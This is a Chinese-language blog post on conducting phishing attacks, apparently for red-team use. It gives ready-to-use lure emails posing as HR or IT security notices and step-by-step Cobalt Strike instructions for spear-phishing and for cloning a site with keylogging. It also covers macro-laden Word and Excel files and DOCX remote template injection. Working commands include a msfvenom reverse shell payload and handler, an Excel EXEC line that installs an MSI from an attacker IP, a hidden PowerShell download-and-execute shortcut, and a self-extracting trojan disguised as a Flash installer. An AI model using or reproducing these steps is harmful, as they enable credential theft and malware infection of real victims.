@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 5.4.2">
+
+  
+    <meta name="description" content="No matter how far you may fly, never forget where you come from.">
+  
+
+  
+
+  
+    <meta name="author" content="WsyKer">
+  
+
+  
+
+  
+
+  <title>浅谈钓鱼攻击 | WsyKer&#39;s Blog</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://wsyker.oss-cn-beijing.aliyuncs.com/img/blog/title.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          WsyKer&#39;s Blog
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">浅谈钓鱼攻击</h1>
+          <h2 class="title-sub-wrap">
+            <strong>WsyKer</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2022-08-02T11:54:31.000Z" itemprop="datePublished">2022-08-02</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">📒 红蓝对抗</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">🏷️ 内网安全</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h2 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h2><h3 id="什么是钓鱼："><a href="#什么是钓鱼：" class="headerlink" title="什么是钓鱼："></a>什么是钓鱼：</h3><p>网络钓鱼是目前最常见的攻击手法之一，通过信息收集，获取受害者们的邮箱、姓名、职务、手机等个人信息，再利用社会工程学手段进行攻击，所谓社会工程学，是一种通过对受害者心理弱点、本能反应、好奇心、信任、贪心等心理缺陷进行诸如欺骗、伤害等危害手段，在生活工作中，最常使用的邮件，各种文档也成为黑客常用的攻击载体，近些年来，网络钓鱼攻击趋势也一直是增长趋势，特别是在APT攻击，勒索软件等事件中，扮演了重要的角色。</p>
+<h3 id="SMTP协议："><a href="#SMTP协议：" class="headerlink" title="SMTP协议："></a>SMTP协议：</h3><p>SMTP全称是 Simple Mail Transfer Protocol， 是一种提供可靠且有效的电子邮件传输的协议  SMTP是建立在FTP文件传输服务上的一种邮件服务，主要用于系统之间的邮件信息传递，并提供有关来信的通知，其重要特性之一是其能跨越网络传输邮件，即“SMTP邮件中继”。使用SMTP，可实现相同网络处理进程之间的邮件传输，也可通过中继器或网关实现某处理进程与其他网络之间的邮件传输。</p>
+<ul>
+<li>SMTP默认端口：25</li>
+<li>SSL SMTP默认端口：465</li>
+</ul>
+<h3 id="POP协议："><a href="#POP协议：" class="headerlink" title="POP协议："></a>POP协议：</h3><p>POP的全称是 Post Office Protocol，即邮局协议，用于电子邮件的接收，常用的是第三版 ，所以简称为POP3，POP3仍采用Client&#x2F;Server工作模式，Client被称为客户端，一般我们日常使用电脑都是作为客户端，而Server（服务器）则是网管人员进行管理的。举个形象的例子，Server（服务器）是许多小信箱的集合，就像我们所居住楼房的信箱结构，而客户端就好比是一个人拿着钥匙去信箱开锁取信一样的道理。</p>
+<ul>
+<li>POP3默认端口：110</li>
+</ul>
+<h3 id="IMAP协议："><a href="#IMAP协议：" class="headerlink" title="IMAP协议："></a>IMAP协议：</h3><p>IMAP全称是 Internet Message Access Protocol 以前称作交互邮件访问协议，是一个应用层协议。主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。</p>
+<ul>
+<li>IMAP默认端口：143</li>
+</ul>
+<h3 id="SPF-amp-amp-DKIM-amp-amp-DMARC："><a href="#SPF-amp-amp-DKIM-amp-amp-DMARC：" class="headerlink" title="SPF &amp;&amp; DKIM &amp;&amp; DMARC："></a>SPF &amp;&amp; DKIM &amp;&amp; DMARC：</h3><p>SPF全称是 Sender Policy Framework , 中文发件人策略框架，由于SMTP协议设计过于简单，攻击者可以轻易的伪造邮箱，所以SPF的作用是防范垃圾邮件而提出来的一种DNS记录类型，当然SPF也是可以被绕过的，它是一种TXT类型的记录，邮件接收方首先会去检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件并进行退回，使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=txt qq.com</span><br></pre></td></tr></table></figure>
+
+<p>DKIM全称是 DomainKeys Identified Mail 电子邮件验证标准——域名密钥识别邮件标准， 同样依赖于DNS的TXT记录类型，一般来说，发送方会在电子邮件的标题插入DKIM-Signature及电子签名资讯。而接收方则透过DNS查询得到公开密钥后进行验证。</p>
+<p>DMARC全称是 Domain-based Message Authentication, Reporting and Conformance ， 2012年1月30号由Paypal，Google，微软，雅虎等开发，相关内容有DMARC协议。   一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议   由Mail Sender方（域名拥有者Domain Owner）在[DNS]里声明自己采用该协议。当Mail Receiver方（其MTA需支持DMARC协议）收到该域发送过来的邮件时，则进行DMARC校验，若校验失败还需发送一封report到指定[URI]（常是一个邮箱地址）。  </p>
+<h2 id="二、前期准备"><a href="#二、前期准备" class="headerlink" title="二、前期准备"></a>二、前期准备</h2><h3 id="基础设施："><a href="#基础设施：" class="headerlink" title="基础设施："></a>基础设施：</h3><p>在进行钓鱼之前，需要准备一些邮箱服务，国内比较多的是网易163，qq等等，国外网站有hotmail、outlook等等，这里使用网易邮箱进行搭建stmp服务，然后链接到Cobalt Strike上，使用Cobalt Strike进行发送钓鱼邮件</p>
+<ol>
+<li>首先登录网易163账号，点击POP3&#x2F;SMTP&#x2F;IMAP，再点击开启pop3&#x2F;smtp服务，图中已开启，在开启时还会有个授权码</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1.png" alt="1"></p>
+<ol start="2">
+<li>在Mali Server处添加邮件</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host：输入smtp.163.com</span><br><span class="line">Port：输入465</span><br><span class="line">Username：输入自己的邮箱</span><br><span class="line">Password：输入开启smtp服务时所生成的授权码</span><br><span class="line">Connection：选择ssl</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/2.png" alt="2"></p>
+<ol start="3">
+<li>制作钓鱼邮件，Attacks –&gt; Speah Phish</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Targets：受害者邮箱</span><br><span class="line">Template：邮件</span><br><span class="line">Attachment：附件</span><br><span class="line">Embed URL：地址</span><br><span class="line">Mail Server：邮箱系统</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/3.png" alt="3"></p>
+<ol start="4">
+<li>制作受害者邮箱，格式如下</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">受害者1@xxx.com		snail</span><br><span class="line">受害者2@xxx.com		snail</span><br><span class="line">受害者3@xxx.com		snail</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>使用qq给163发送一封钓鱼邮件，然后在更多 –&gt; 导出邮件处导出邮件，后缀为.eml</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/4.png" alt="4"></p>
+<ol start="6">
+<li>把受害者邮件以及钓鱼邮件导入，点击send就会像受害者发送邮件</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/5.png" alt="5"></p>
+<ol start="7">
+<li>在send email可以看到详细信息</li>
+</ol>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/6.png" alt="6"></p>
+<h3 id="钓鱼话术："><a href="#钓鱼话术：" class="headerlink" title="钓鱼话术："></a>钓鱼话术：</h3><p>这里介绍一些常用的钓鱼话术，当然在实际情况中，要结合受害者信息进行修改</p>
+<ol>
+<li>网页模板</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">各位同事，大家好！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">网络安全为人民，网络安全靠人民。</span><br><span class="line">本周为网络安全知识学习周，根据统一安排，本周五将开展全员的线上保密意识考试，目前已将相关学习视频上传到E-Learning上，请各位同事及时登录学习，试题将会从视频中的知识点里抽取。请各位认真学习观看视频。考试未通过者将由人力资源部进行相关处罚。</span><br><span class="line">平台地址:登录地址</span><br><span class="line">------------------------------------------</span><br><span class="line">(请删除括号部分,输入发送人名)</span><br><span class="line">人力资源部</span><br><span class="line">(请删除括号部分,输入公司名称)</span><br><span class="line">(请删除括号部分,输入地址信息)</span><br><span class="line">电话：(请删除括号部分,输入电话信息)</span><br><span class="line">邮箱：test@outlook.com</span><br><span class="line">邮编：200041</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>网络安全培训</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">各位同事，大家好！</span><br><span class="line">网络安全为人民，网络安全靠人民。</span><br><span class="line">本周为网络安全知识学习周，根据统一安排，本周五将开展全员的线上保密意识考试，目前已将相关学习视频上传到学习平台上，请各位同事及时登录学习，试题将会从视频中的知识点里抽取。请各位认真学习观看视频。考试未通过者将由人力资源部进行相关处罚。</span><br><span class="line">平台地址:</span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">Best wishes     </span><br><span class="line">----------------------------</span><br><span class="line">IT部</span><br><span class="line">xxxxx</span><br><span class="line">xxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>护网行动通知</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">为确保x月份xxx省公安厅主办的重点保障活动（以下简称活动）的成功实施，全面保障我xxx的信息系统安全，现要求对各服务器及个人终端进行弱口令自查。 </span><br><span class="line"></span><br><span class="line">安全口令要求：</span><br><span class="line">1.不使用空口令或系统缺省的口令，因为这些口令众所周知，为典型的弱口令。 </span><br><span class="line">2.口令长度不小于8个字符。 </span><br><span class="line">3.口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。 </span><br><span class="line">4.口令应该为以下四类[字符](https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6)的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">附件(弱口令自查工具) </span><br><span class="line">xxx. </span><br><span class="line">2020年x月x日</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、钓鱼实战"><a href="#三、钓鱼实战" class="headerlink" title="三、钓鱼实战"></a>三、钓鱼实战</h2><h3 id="钓鱼网站："><a href="#钓鱼网站：" class="headerlink" title="钓鱼网站："></a>钓鱼网站：</h3><p>钓鱼网站相信大家都遇到过，一些最初在各大QQ群常见的扫描二维码进入空间钓鱼，以及针对学生，用奖学金国家补助等登录qq邮箱，配合着特定的话术以及和原网站看起来相同的域名来提高诈骗率等等，上述这两种钓鱼方法是最为常见的方法，把源码解压到服务器，然后受害者在访问网站时会看到一个和正规网站相同的网站，从而输入账号密码等敏感信息，随后这些敏感信息就会发送到攻击者后台，这里介绍一下使用Cobalt Strike伪造网站的方法，位置：Attacks –&gt; Web Drive-be –&gt; Clone site</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659377457953-17d52281-c69d-49af-93e1-5ef3aed67732.png" alt="img"></p>
+<p>上述分别对应的是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Clone URL：所克隆网站的url</span><br><span class="line">Local URL：本地url</span><br><span class="line">Local Host：host</span><br><span class="line">Local Port：端口</span><br><span class="line">Attack：搭建内容(木马)</span><br><span class="line">Log key：是否开启键盘监听(此处选上)</span><br></pre></td></tr></table></figure>
+
+<p>此处对百度进行伪造，输入百度链接就行了</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659377634177-954acf49-d989-4efe-a7f8-2c41cfa9d03f.png" alt="img"></p>
+<p>然后随便输入个什么字符，cs这边都能接收到，这边就不放图了，有兴趣的自己尝试</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659377723569-e7b66c6e-e067-4478-8885-019fda9769ca.png" alt="img"></p>
+<h3 id="Office钓鱼："><a href="#Office钓鱼：" class="headerlink" title="Office钓鱼："></a>Office钓鱼：</h3><p>Office宏，宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中完成某项特定的任务，而不必再重复想要的动作，目的是让用户文档中的一些任务自动化，而宏病毒是一种寄存在文档或模板的宏中的计算机病毒，一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上，Visual Bacic for Applications（VBA）是Visual Bacic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境：cs4.3，word2016</span><br></pre></td></tr></table></figure>
+
+<p>首先打开word2016的自定义功能区，勾住开发工具<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645170271507-3fe0c5a4-ed86-409c-a048-2dff714c74df.png" alt="img"></p>
+<p>第二步点击宏，名字随意<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645170409303-a46439d9-87e3-4e18-a7d4-0192b4c2f7d3.png" alt="img"></p>
+<p>选择创建</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645170453833-772bddd4-0a37-4745-a946-258fea2470b2.png" alt="img"></p>
+<p>然后回到cs，生成宏病毒<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645170855056-88f4f414-69b3-42cd-b7fc-8ad2ba522f5e.png" alt="img"></p>
+<p>把生成好的内容，直接全选把原有的贴过去，然后选择Auto_Open<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645170962767-b3869082-d85f-4d03-9834-6ada00189299.png" alt="img"></p>
+<p>ctrl+s进行保存，然后提示无法保存再未启用宏的文档中，选择否<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645171136891-f19cfb97-a620-41c6-9a1d-0954d839dc84.png" alt="img">然后就会要新保存在另外一个文档，选择启用宏的word模板<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645171314543-dbbc6e21-208c-4079-94e4-c7ab7ed27630.png" alt="img"></p>
+<p>然后右键打开即可上线，记住只可以右键打开，双击打开无效<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645171568441-393d329a-c461-4e22-9af3-32dba5d79c4a.png" alt="img"></p>
+<h3 id="DOCX远程注入："><a href="#DOCX远程注入：" class="headerlink" title="DOCX远程注入："></a>DOCX远程注入：</h3><p>与传统的宏启用文档相比，这种攻击的好处是多方面的，在对目标执行网络钓鱼攻击时，您可以将.docx的文档直接附加到电子邮件中，并且您不太可能根据文件的拓展名去阻止它，Word远程模板执行宏就是利用Word文档加载附加模板时的缺陷所发起的恶意请求而达到的攻击目的，所以当目标用户点开攻击者发给他的恶意word文档就可以通过向远程服务器发送恶意请求的方法，然后加载模板执行恶意模板的宏。这种攻击更常见的原因是，发送的文档本身是不带恶意代码的，能过很多静态的检测。</p>
+<p>首先需要创建一个上文中包含宏病毒的.dotm模板</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645173648149-0d93ee57-2e2f-48a4-af36-dd72ac7a2e6b.png" alt="img"></p>
+<p>然后把创建好的文件放到远程服务器上<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645174120939-75e7328d-f9ba-4701-b1d3-d6fca033bd39.png" alt="img"></p>
+<p>完成以后，新创建一个word文档，在文档中选择任意模板，比如学习资料，个人简历等等，然后修改docx后缀为zip，进行解压</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645174498695-26ad4b66-4a3c-4a58-b568-772fb6da863e.png" alt="img"></p>
+<p>解压完成后就是如上图所示，打开word&#x2F;_rels文件夹，选择settings.xml.rels，没有选择模板，就没有这个文件</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645174801123-dfb3d938-9d84-4f1c-ba61-d348a3d9d79d.png" alt="img"></p>
+<p>打开这个文件，修改链接为刚才服务器+.dotm宏病毒文件的链接<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645174983902-d16a554b-b687-4347-a24d-75fc11074b47.png" alt="img">进行保存，然后重新把这个目录压缩成zip，再修改zip为docx，双击打开启动宏即可上线<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645175153661-ba42dbae-763c-4a36-85e3-d5f883288405.png" alt="img"></p>
+<h3 id="Excel4-0宏："><a href="#Excel4-0宏：" class="headerlink" title="Excel4.0宏："></a>Excel4.0宏：</h3><p>Excel一般指Microsoft Office Microsoft Excel是Microsoft为使用Windows和Aoole Macintosh操纵系统的电脑编写的一款电子表格软件，直观的界面、出色的计算功能和图标工具，再加上成功的市场营销，使Excel称谓最流行的个人计算机数据处理软件，它跟office一样都是支持宏，所以一样存在宏病毒，当我们把恶意的宏代码嵌入Excel中，用户打开Excel文件里的宏就会被触发。</p>
+<p>首先使用kali生成msi文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=ip lport=端口 -f msi -o hack.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645497113863-9ff533a9-c206-4c44-aa3b-ef306b273e4d.png" alt="img"></p>
+<p>生成好后，开启一个web服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645497596931-ffc99c34-7c35-4cae-a906-b4066b95c5bb.png" alt="img"></p>
+<p>第二步可以去监听端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set LHOST 172.16.1.57 msf5 exploit(multi/handler) &gt; set LPORT 1234 msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645497890587-ca8c7a5d-c338-4d29-95d3-86d237e9b8d0.png" alt="img"></p>
+<p>第三步创建一个execl文件，然后右键插入宏<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645498019931-30a74955-397f-478c-b31c-812279aedc37.png" alt="img"></p>
+<p>选择MS Execl4.0宏表</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645498051427-82ca81fb-aeab-4b3a-9ca0-548d3a2fa7b1.png" alt="img"></p>
+<p>然后把以下代码贴过去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=EXEC(&quot;msiexec /q /i http://172.16.1.57/hack.msi&quot;) =HALT()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645498465117-d799fc33-8143-49c0-8141-a5ec69843eab.png" alt="img"></p>
+<p>然后修改单元格名为Auto_Open，文档被打开时自动运行宏<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645499194622-73044d05-5a2f-4797-8ec4-c8f2fcf77fd2.png" alt="img"></p>
+<p>为了防止被发现可以右键宏选择隐藏<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645499238692-62384b4b-93da-45e0-9d62-5f8175658e88.png" alt="img"></p>
+<p>第三步保存文件，会提示以下信息<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645499397481-90cea360-7e0b-4afb-8d09-252d5b481667.png" alt="img">这里选择否，然后另外为xlsm格式，右键打开刚才保存的文件，点击启用宏即可上线<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645499458625-82b3f2b0-5eb1-4024-a106-84a38946b19b.png" alt="img"></p>
+<h3 id="Ink快捷方式："><a href="#Ink快捷方式：" class="headerlink" title="Ink快捷方式："></a>Ink快捷方式：</h3><p>Ink文件是用于指向其他文件的一种文件，这些文件通常被称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快捷的调用</p>
+<p>首先使用cs生成一个powershell上线</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645603557829-ed06a51f-25c1-4d03-a45c-e7714b4e6a64.png" alt="img"></p>
+<p>然后随便选择一个文件右键生成快捷方式<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645603626997-3d804254-cd32-4d03-82d4-6a0489f58440.png" alt="img"></p>
+<p>右键这个快捷方式文件，选择属性</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645603655042-30a98615-e491-44f3-b543-02f1dcd913b5.png" alt="img"></p>
+<p>修改目标为powershell地址以及刚才生成的powershell远程上线命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://172.16.1.57:8444/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645603783691-065366f7-664b-4570-a9df-6e3184b96990.png" alt="img"></p>
+<p>修改完了后，再次右键选择属性进行修改图标<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645603872196-a7216bd3-eaa4-41d1-8895-21496af8c3d9.png" alt="img"></p>
+<p>然后再修改一个后缀，双击打开即可上线<img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1645603938248-85faf068-9feb-4f67-85a6-69e9cf888a3c.png" alt="img"></p>
+<h3 id="XSS-amp-amp-RAR自解压："><a href="#XSS-amp-amp-RAR自解压：" class="headerlink" title="XSS &amp;&amp; RAR自解压："></a>XSS &amp;&amp; RAR自解压：</h3><p>这里把XSS Flash钓鱼和RAR自解压钓鱼写到一块，某大佬的项目地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hackxc/xss_flash</span><br></pre></td></tr></table></figure>
+
+<p>搭建flash钓鱼网站，这里使用phpstudy本地搭建，根目录设置为Flash.cn文件夹</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1609994617807-364cfd57-abaa-44b0-bfaa-442f5b4b5708.png" alt="img"></p>
+<p>搭建完成，大佬写的项目还是很像的</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1609994682402-f9ac977c-2a46-46be-b433-58c0cc56e2b6.png" alt="img"></p>
+<p>这里使用cobaltstrike生成木马，Attacks –&gt; Packages –&gt;Windows Executable</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1609995398448-198de1e6-2fd0-4605-add1-4f23e185a3c4.png" alt="img"></p>
+<p>生成好木马后还需要电脑上下载有winrar解压软件，下载好后创建一个新的文件夹，我这里命名的捆绑木马制作，然后按照下图，把所有的东西都复制进去，还有cobaltstrike生成的木马</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610010733424-436c13e2-beb6-4eb6-afb9-18c9547c4a6c.png" alt="img"></p>
+<p>选择这些东西，然后右键进行压缩，并更改后缀为exe</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610010379304-2ebe4ca4-b3f7-4766-8fc0-1d95d94d355d.png" alt="img"></p>
+<p>点击高级 –&gt; 自解压选项 –&gt; 解压路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\temp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610011008553-cce5c16e-4e6a-45a4-8c16-fd9878a833cf.png" alt="img"></p>
+<p>点击设置，选择提取后运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\temp\artifact.exe</span><br><span class="line">C:\windows\temp\flashplayerpp_install_cn.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610011160842-3f85a88e-8831-4456-84a5-943ff042b12c.png" alt="img"></p>
+<p>点击模式选择全部隐藏</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610011361872-9a7a8ceb-1fd5-4ad6-ac0b-ad0a8f1dacd4.png" alt="img"></p>
+<p>点击更新，选择解压并更新文件和覆盖所有文件</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610011417894-6359a925-7ded-4b71-a107-97688a573776.png" alt="img"></p>
+<p>保存后，生成exe，点击后会解压软件然后执行，这里再使用cobaltstrike上的host file功能挂载到服务器上</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610011603783-ee428497-315a-430d-9c3c-9c5d7036b3e9.png" alt="img"></p>
+<p>然后把cobaltstrike生成好的链接去替换到鱼网站主页的下载链接</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610011706168-e405f75c-c465-4135-a628-d66da330ff38.png" alt="img"></p>
